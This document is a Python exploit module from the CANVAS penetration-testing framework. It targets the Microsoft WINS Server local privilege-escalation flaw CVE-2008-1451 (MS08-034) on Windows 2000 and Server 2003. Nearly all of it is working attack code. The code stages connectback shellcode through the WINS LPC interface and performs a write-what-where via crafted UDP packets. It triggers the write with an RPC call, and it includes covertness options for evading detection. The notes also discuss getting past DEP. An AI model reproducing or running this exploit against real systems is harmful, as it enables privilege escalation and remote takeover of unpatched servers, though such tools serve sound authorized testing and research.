#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import struct
from exploitutils import *
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
import canvasengine
from libs.newsmb.epmap import EPMAP, EPTHandle
import libs.newsmb.libdcerpc as libdcerpc


NAME='Microsoft WINS Server Vulnerability'
DESCRIPTION='Microsoft WINS Server Vulnerability'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['CVE Name'] = 'CVE-2008-1451'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1451'
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1451'
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/Bulletin/MS08-034.mspx'
DOCUMENTATION['Date public']='06/10/2008'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']
PROPERTY['MSADV']='MS08-034'
PROPERTY['MS PATCHES']=["KB948745"]

NOTES="""
*EARLY POC*: Still some reliability work to do.

At this stage, you have to *manually* provide the UDP port used by WINS notification socket.
Later versions might be able to do that automatically. Why wouldn't it be exploitable remotely?
It seems that the socket is bound to localhost only after MS04-045/UR1!

I put a connectback shellcode at the moment because it was faster this way, I'll come up with
a better one soon.

DEP OptIn or above won't allow us to use the shared section trick on 2003. Any idea?
Using RPC, our data ends up at [[esp+4]+8]. If we can make esp point in there and return, we
can then do a ret2libc to disable DEP.

Wins.exe: 5.0.2195.6870 (MS04-045)
          5.0.2195.7005 (UR1)
          5.0.2195.7155 (MS08-034) *patched*
          5.2.3790.1830 (SP0?)
          5.2.3790.3959 (SP1)
Usage:
Win32/MOSDEF$ runmodule ms08_034 -p 1046 -l 10.10.11.1 -d 5555
"""

TODO="""
"""

#All the versioning is done by the exploit
targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000 SP4',0x010246b4,'811109bf-a4e1-11d1-ab54-00a0c91e9b45',1],
    2: ['Windows Server 2003 SP0&SP1 (DEP AlwaysOff)',0x010256e8,'811109bf-a4e1-11d1-ab54-00a0c91e9b45',1],
}

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name      = NAME
        self.result    = 0
        self.lpcname   = ''
        self.port      = 1027 #WINS notification socket UDP port
        self.rpcport   = 0 #WINS RPC interface TCP port
        self.badstring = ''
        self.use_local_interface = False
        self.subesp    = 0

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)

    def getArgs(self):
        self.port=int(self.argsDict.get('port',self.port))
        self.lpcname=self.argsDict.get('lpcname',self.lpcname)
        self.rpcport=int(self.argsDict.get('rpcport',self.rpcport))
        return

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        unsued,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        version=0
        if major==5 and minor==0:
            version=1 #Windows 2000 SP4
        elif major==5 and minor==2:
            version=2 #Windows Server 2003 SP0&SP1
        if version==0:
            self.log('This exploit is only for Windows 2000 and Windows Server 2003')
            return 0
        info, where, iface, opnum = targets[version]
        if self.lpcname=='':
            self.log('Listing RPC interfaces, this might take a while...')
            auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
            auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

            if self.covertness >= 2:
                self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

            frag_level = None
            if self.covertness >= 5 and self.covertness < 11:
                self.log('Crypto + moderate SMB fragmentation')
                frag_level = 1
            elif self.covertness == 11:
                self.log('Crypto + MAX fragmentation')
                frag_level = 2

            try:
                rpcdump = EPMAP(u'ncacn_ip_tcp:127.0.0.1[135]', getsock=self, frag_level=frag_level)
                res =  rpcdump.bind(u'e1af8308-5d1f-11c9-91a4-08002b14a0fa', u'3.0', auth_type=auth_type, auth_level=auth_level)
                if not res:
                    rpcdump = []
                else:
                    rpcdump = map(lambda x: EPTHandle(x), rpcdump.dump())
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)
                rpcdump = []

            for entry in rpcdump:
                rpcinfo=entry.getinfo().split(u':')
                if rpcinfo[0]==iface and rpcinfo[2]==u'ncalrpc':
                    self.lpcname='\\RPC Control\\'+rpcinfo[3]
                elif rpcinfo[0]==iface and rpcinfo[2]==u'tcp':
                    self.rpcport=int(rpcinfo[3])
        if self.lpcname=='':
            self.log('WINS ncalrpc could not be found')
            return 0
        if self.rpcport==0:
            self.log('WINS ncacn_ip_tcp port could not be found')
            return 0
        data=''
        data+='\xeb\x06AA' #jmp forward
        data+='CCCC' #overwritten
        data+=self.createShellcode() #'\xcc'*0x200 #shellcode
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        data=''
        data+=struct.pack('<L',address) #what
        data+=struct.pack('<L',where) #where
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        data=''
        data+=struct.pack('<LLLLLLLLLLLL',0,0,1,0,0xffffffff,0,0,0,0,0,0,address)
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        self.log('Sending packet to port %d'%(self.port))
        s=self.getudpsock()
        s.connect(('127.0.0.1',self.port)) #local connection
        data=''
        data+=struct.pack('<LLLLLL',1,0,1,0,1,address)
        s.send(data)
        s.close()
        res = None

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2

        try:
            auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
            auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
            dce = libdcerpc.DCERPC(u'ncacn_ip_tcp:127.0.0.1[%d]' % self.rpcport, getsock=self, frag_level=frag_level)
            res = dce.bind(iface, u'1.0', auth_type=auth_type, auth_level=auth_level)
        except libdcerpc.DCERPCException, ex:
            self.log('DCERPC Error: %s' % ex)
            return 0

        if not res:
            self.log('WINS RPC bind failed')
            return 0

        data=''
        #data+=struct.pack('<L',1) #[unique]
        #data+=s_dce_raw_unistring('A'*512)
        #data+=struct.pack('<L',0)
        data+='A'*1024
        dce.call(opnum, data, response=False)
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s (in progress)'%(NAME))
        success=0
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
